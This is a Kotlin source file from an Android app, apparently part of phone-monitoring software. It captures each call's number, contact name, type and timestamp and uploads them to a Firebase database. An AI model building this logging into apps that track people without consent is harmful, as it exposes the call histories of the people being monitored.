package com.example.rule.dash.services.calls

import android.content.Context
import com.example.rule.dash.data.model.Calls
import com.example.rule.dash.data.rxFirebase.InterfaceFirebase
import com.example.rule.dash.services.base.BaseInteractorService
import com.example.rule.dash.utils.ConstFun.getDateTime
import com.example.rule.dash.utils.Consts.CALLS
import com.example.rule.dash.utils.Consts.DATA
import com.example.rule.dash.utils.FileHelper.getContactName
import javax.inject.Inject

class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var contact: String? = null
    private var phoneNumber: String? = null
    private var type : Int = 0
    private var dateTime: String? = null

    override fun startRecording(phoneNumber:     String?,type:Int) {

        this.type = type
        this.phoneNumber = phoneNumber
        dateTime = getDateTime()
        contact = getContext().getContactName(phoneNumber)

    }

    override fun stopRecording() {
        sendFileCall()
    }

    private fun deleteFile() {
        if (getService() != null) getService()!!.stopServiceCalls()
    }

    private fun sendFileCall() {
        setPushName()
        deleteFile()
    }

    private fun setPushName() {
        val calls = Calls(contact, phoneNumber, dateTime, "0", type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }


}